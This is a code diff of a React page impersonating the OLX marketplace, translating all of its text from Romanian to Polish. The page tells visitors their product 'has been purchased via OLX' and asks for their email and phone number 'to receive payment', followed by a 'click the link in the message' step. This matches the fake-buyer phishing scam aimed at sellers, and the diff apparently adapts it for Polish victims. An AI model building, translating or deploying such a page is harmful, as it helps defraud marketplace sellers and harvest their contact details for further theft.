@@ -24,11 +24,11 @@ export default function OLXForm() {
     if (!formData.email.trim()) {
       newErrors.email = 'Adres e-mail jest wymagany';
     } else if (!emailRegex.test(formData.email)) {
-      newErrors.email = 'Introduceți o adresă de email validă';
+      newErrors.email = 'Wprowadź prawidłowy adres e-mail';
     }
 
     if (!formData.phone.trim()) {
-      newErrors.phone = 'Numărul de telefon este obligatoriu';
+      newErrors.phone = 'Numer telefonu jest wymagany';
     }
 
     setErrors(newErrors);
@@ -88,11 +88,11 @@ export default function OLXForm() {
             </div>
 
             <h2 className="text-2xl font-bold text-gray-800 mb-4">
-              Email-ul a fost trimis!
+              E-mail został wysłany!
             </h2>
             
             <p className="text-gray-600 mb-4">
-              Am trimis un mesaj la adresa:
+              Wysłaliśmy wiadomość na adres:
             </p>
             
             <p className="font-semibold text-gray-800 mb-6">
@@ -104,48 +104,48 @@ export default function OLXForm() {
                 <div className="w-6 h-6 bg-[#23E5DB] rounded-full flex items-center justify-center">
                   <span className="text-white text-sm">ℹ</span>
                 </div>
-                <span className="ml-2 font-semibold text-gray-800">Ce urmează?</span>
+                <span className="ml-2 font-semibold text-gray-800">Co dalej?</span>
               </div>
               
               <div className="text-left space-y-2 text-sm text-gray-600">
                 <div className="flex items-start">
                   <span className="text-[#23E5DB] font-bold mr-2">1.</span>
-                  <span>Verificați-vă căsuța poștală</span>
+                  <span>Sprawdź swoją skrzynkę pocztową</span>
                 </div>
                 <div className="flex items-start">
                   <span className="text-[#23E5DB] font-bold mr-2">2.</span>
-                  <span>Faceți clic pe linkul din mesajul primit</span>
+                  <span>Kliknij link w otrzymanej wiadomości</span>
                 </div>
                 <div className="flex items-start">
                   <span className="text-[#23E5DB] font-bold mr-2">3.</span>
-                  <span>Dacă nu vedeți email-ul, verificați folderul spam</span>
+                  <span>Jeśli nie widzisz e-maila, sprawdź folder spam</span>
                 </div>
               </div>
             </div>
 
             <div className="text-center text-lg font-semibold text-[#23E5DB] mb-6">
-              Veți primi email-ul în 5-10 minute
+              Otrzymasz e-mail w ciągu 5-10 minut
             </div>
 
             <button 
               onClick={() => setIsSubmitted(false)}
               className="w-full bg-[#002F34] hover:bg-[#001F24] text-white font-semibold py-3 px-6 rounded-xl transition-colors duration-200"
             >
-              Trimiteți din nou
+              Wyślij ponownie
             </button>
 
             <button 
               onClick={() => setIsSubmitted(false)}
               className="w-full mt-3 bg-transparent text-gray-600 hover:text-gray-800 font-medium py-3 px-6 transition-colors duration-200"
             >
-              Schimbați adresa de email
+              Zmień adres e-mail
             </button>
           </div>
 
           <p className="text-center text-sm text-gray-500 mt-6">
-            Probleme cu primirea email-urilor?
+            Problemy z otrzymywaniem e-maili?
             <a href="#" className="text-[#23E5DB] hover:underline ml-1">
-              Contactați suportul
+              Skontaktuj się z pomocą
             </a>
           </p>
         </div>
@@ -165,20 +165,20 @@ export default function OLXForm() {
 
         <div className="bg-white rounded-2xl shadow-lg p-8">
           <h1 className="text-2xl font-bold text-gray-800 mb-4 text-center">
-            Bun venit pe OLX!
+            Witamy w OLX!
           </h1>
           
           <p className="text-gray-600 text-center mb-8 leading-relaxed">
-            Produsul dvs. a fost cumpărat prin OLX. Vă rugăm să 
-            furnizați adresa de email și numărul de telefon pentru a primi 
-            plata pentru produs.
+            Twój produkt został zakupiony przez OLX. Prosimy o 
+            podanie adresu e-mail i numeru telefonu, aby otrzymać 
+            płatność za produkt.
           </p>
 
           <form onSubmit={handleSubmit} className="space-y-6">
             {/* Email Field */}
             <div>
               <label htmlFor="email" className="block text-sm font-semibold text-gray-700 mb-2">
-                Adresa de email
+                Adres e-mail
               </label>
               <input
                 type="email"
@@ -186,7 +186,7 @@ export default function OLXForm() {
                 name="email"
                 value={formData.email}
                 onChange={handleInputChange}
-                placeholder="introduceți email-ul dvs."
+                placeholder="wprowadź swój e-mail"
                 className={`w-full px-4 py-3 border rounded-xl focus:outline-none focus:ring-2 focus:ring-[#23E5DB] focus:border-transparent transition-all duration-200 ${
                   errors.email ? 'border-red-500 bg-red-50' : 'border-gray-300 hover:border-gray-400'
                 }`}
@@ -200,7 +200,7 @@ export default function OLXForm() {
             {/* Phone Field */}
             <div>
               <label htmlFor="phone" className="block text-sm font-semibold text-gray-700 mb-2">
-                Numărul de telefon
+                Numer telefonu
               </label>
               <input
                 type="tel"
@@ -208,7 +208,7 @@ export default function OLXForm() {
                 name="phone"
                 value={formData.phone}
                 onChange={handleInputChange}
-                placeholder="introduceți numărul de telefon"
+                placeholder="wprowadź numer telefonu"
                 className={`w-full px-4 py-3 border rounded-xl focus:outline-none focus:ring-2 focus:ring-[#23E5DB] focus:border-transparent transition-all duration-200 ${
                   errors.phone ? 'border-red-500 bg-red-50' : 'border-gray-300 hover:border-gray-400'
                 }`}
@@ -224,17 +224,17 @@ export default function OLXForm() {
               disabled={isLoading}
               className="w-full bg-[#002F34] hover:bg-[#001F24] disabled:bg-gray-400 text-white font-semibold py-3 px-6 rounded-xl transition-all duration-200 transform hover:scale-[1.02] active:scale-[0.98]"
             >
-              {isLoading ? 'Se trimite...' : 'Continuați'}
+              {isLoading ? 'Wysyłanie...' : 'Kontynuuj'}
             </button>
 
             <p className="text-xs text-gray-500 text-center leading-relaxed">
-              Făcând clic pe "Continuați", sunteți de acord cu{' '}
+              Klikając "Kontynuuj", zgadzasz się z{' '}
               <a href="#" className="text-[#23E5DB] hover:underline">
-                Termenii de utilizare
+                Warunkami użytkowania
               </a>{' '}
-              și{' '}
+              i{' '}
               <a href="#" className="text-[#23E5DB] hover:underline">
-                Politica de confidențialitate
+                Polityką prywatności
               </a>
               .
             </p>
@@ -242,9 +242,9 @@ export default function OLXForm() {
         </div>
 
         <p className="text-center text-sm text-gray-500 mt-6">
-          Aveți deja un cont?{' '}
+          Masz już konto?{' '}
           <a href="#" className="text-[#23E5DB] hover:underline font-medium">
-            Conectați-vă
+            Zaloguj się
           </a>
         </p>
       </div>
